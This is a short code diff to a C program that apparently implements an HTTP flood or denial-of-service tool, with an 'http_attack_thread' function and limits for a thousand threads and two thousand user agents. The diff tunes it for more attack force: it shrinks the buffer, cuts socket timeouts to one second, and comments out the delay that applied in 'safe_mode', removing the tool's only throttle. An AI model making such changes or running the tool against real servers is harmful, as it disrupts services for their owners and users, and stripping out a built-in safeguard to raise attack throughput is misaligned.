@@ -11,7 +11,7 @@
 #include <sys/select.h>
 #include <termios.h>
 
-#define BUFFER_SIZE 8192
+#define BUFFER_SIZE 512
 #define MAX_USER_AGENTS 2000
 #define MAX_THREADS 1000
 #define MAX_PATHS 100
@@ -281,7 +281,7 @@ void *http_attack_thread(void *arg) {
         
         // Set aggressive timeouts
         struct timeval tv;
-        tv.tv_sec = 2;
+        tv.tv_sec = 1;
         tv.tv_usec = 0;
         setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
         setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
@@ -368,9 +368,12 @@ void *http_attack_thread(void *arg) {
         close(sockfd);
         
         // Minimal delay for maximum throughput
+    //
+    /*
         if (config->safe_mode) {
             usleep(10000); // 10ms in safe mode
         }
+    */
         // No delay in performance mode
     }
     
